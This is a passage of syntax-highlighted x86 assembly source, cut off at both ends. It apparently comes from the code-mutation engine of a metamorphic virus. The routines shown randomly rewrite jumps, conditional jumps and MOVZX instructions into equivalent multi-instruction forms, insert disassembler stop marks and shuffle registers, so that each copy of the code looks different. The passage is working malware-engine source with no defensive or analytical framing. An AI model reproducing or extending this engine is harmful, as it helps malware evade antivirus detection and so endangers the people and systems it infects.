                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Repeat it the random number that we</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopInsert</span><span class="sc0">    </span><span class="sc1">; got before</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">

</span><span class="sc1">;; Let's insert an instruction that acts as a stop mark for the code branch.</span><span class="sc0">
</span><span class="sc1">;; This is necessary because if we code a jump as a CMP Reg,Reg / JZ @xxx,</span><span class="sc0">
</span><span class="sc1">;; the disassembler will continue tracing the code after the JZ (it's just</span><span class="sc0">
</span><span class="sc1">;; a conditional jump, not an unconditional one). So, we must set a "release"</span><span class="sc0">
</span><span class="sc1">;; mark that makes the disassembler to stop processing this line of code: RET,</span><span class="sc0">
</span><span class="sc1">;; JMP Reg or JMP Mem.</span><span class="sc0">
</span><span class="sc5">@@InsertStopMark</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; 0?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InsertStopMark</span><span class="sc0"> </span><span class="sc1">; Then select another number</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GenerateRET</span><span class="sc0">    </span><span class="sc1">; Make RET</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GenerateJMPMem</span><span class="sc0"> </span><span class="sc1">; Make JMP Mem</span><span class="sc0">
        </span><span class="sc1">; Make a JMP Reg. We don't care where it goes, since it's never</span><span class="sc0">
        </span><span class="sc1">; going to be executed.</span><span class="sc0">
   </span><span class="sc5">@@GenerateJMPReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">           </span><span class="sc1">; Get a random register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Mark 32 bits size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMPReg</span><span class="sc0">     </span><span class="sc1">; Generate a JMP Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
        </span><span class="sc1">; Make a JMP [Mem]</span><span class="sc0">
   </span><span class="sc5">@@GenerateJMPMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0"> </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">
             </span><span class="sc1">;   mov     eax, [ebp+Xp_Immediate] ; Something that I did and</span><span class="sc0">
             </span><span class="sc1">;   and     eax, 0FFFF00FFh         ; I don't remember why... :?</span><span class="sc0">
             </span><span class="sc1">;   mov     [ebp+Xp_Immediate], eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMPMem</span><span class="sc0">           </span><span class="sc1">; Generate a JMP Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@GenerateRET</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenRET</span><span class="sc0">              </span><span class="sc1">; Generate a RET</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenJMP</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function generates a conditional jump directly or composed. Here we</span><span class="sc0">
</span><span class="sc1">;; use all the variants the shrinker is capable to shrink (obviously, because</span><span class="sc0">
</span><span class="sc1">;; if not this jumps would never be compressed).</span><span class="sc0">
</span><span class="sc5">Xp_GenJcc</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; Code the composed jumps only on the first</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">   </span><span class="sc1">; levels of recursivity</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; Make it directly with a prob. of 75%</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
   </span><span class="sc5">@@Double</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Get a chance of 1/16</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double2</span><span class="sc0">       </span><span class="sc1">; If the odds selected the other 15/16,</span><span class="sc0">
                                      </span><span class="sc1">; make a normal double</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Mark the conditional jump as being</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; coded as NEG_Jcc + JMP. For example:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@InternalSingle2</span><span class="sc0"> </span><span class="sc1">; JZ @x  --&gt;  JNZ @y/JMP @x/ @y:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Double2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">     </span><span class="sc1">; JAE?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_JAE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">     </span><span class="sc1">; JNZ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_JNZ</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc0">     </span><span class="sc1">; JBE?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
   </span><span class="sc5">@@Double_JBE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc0">   </span><span class="sc1">; If JBE, we can select any pair from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">   </span><span class="sc1">; the set JB,JZ,JBE and we'll making a JBE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_GarbleAndSelect</span><span class="sc0">
   </span><span class="sc5">@@Double_JNZ</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc0">   </span><span class="sc1">; If JNZ, we can select a pair from the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">   </span><span class="sc1">; set JB,JNZ,JA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_GarbleAndSelect</span><span class="sc0">
   </span><span class="sc5">@@Double_JAE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">   </span><span class="sc1">; If JAE, the set to select is JAE,JZ,JA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">
   </span><span class="sc5">@@Double_GarbleAndSelect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GarbleRegisters</span><span class="sc0"> </span><span class="sc1">; Get ramdomly two from that set.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Generate the first Jcc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@InternalSingle</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; Generate the second Jcc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@InternalSingle</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@InternalSingle</span><span class="sc0">           </span><span class="sc1">; Make it single</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">

</span><span class="sc5">Xp_GenJcc_SingleJcc</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">@@InternalSingle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; For singles, we mark the Jcc as</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; not being NEG_Jcc/JMP</span><span class="sc0">
   </span><span class="sc5">@@InternalSingle2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Code the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_GenJcc</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function is to generate a MOVZX. We have three variants: the MOVZX</span><span class="sc0">
</span><span class="sc1">;; itself, MOV Reg,[Mem]/AND Reg,0FF or MOV Reg,0/MOV Reg8,[Mem]</span><span class="sc0">
</span><span class="sc5">Xp_GenMOVZX</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">   </span><span class="sc1">; Single?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">          </span><span class="sc1">; Then, jump</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_1</span><span class="sc0">        </span><span class="sc1">; Pair 1 or pair 2?</span><span class="sc0">
       </span><span class="sc5">@@Double_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; First construct the MOV Reg,[Mem]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">  </span><span class="sc1">; Generate the operation</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; And now make AND Reg,0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">  </span><span class="sc1">; Generate the operation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
       </span><span class="sc5">@@Double_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Register8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Make first a MOV Reg,0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">         </span><span class="sc1">; And now make a MOV Reg8,[Mem]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
       </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">        </span><span class="sc1">; Code directly the instruction.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenMOVZX</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to make the SET_WEIGHT code mark.</span><span class="sc0">
</span><span class="sc5">Xp_MakeSET_WEIGHT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReadWeightIdent0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReadWeightIdent1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReadWeightIdent2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReadWeightIdent3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReadWeightIdent4</span><span class="sc0">
       </span><span class="sc5">@@ReadWeightIdent5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X020_23</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetWeight</span><span class="sc0">
       </span><span class="sc5">@@ReadWeightIdent0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X000_3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetWeight</span><span class="sc0">
       </span><span class="sc5">@@ReadWeightIdent1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X004_7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetWeight</span><span class="sc0">
       </span><span class="sc5">@@ReadWeightIdent2</span><span class="sc4">:</span><span class="sc0">
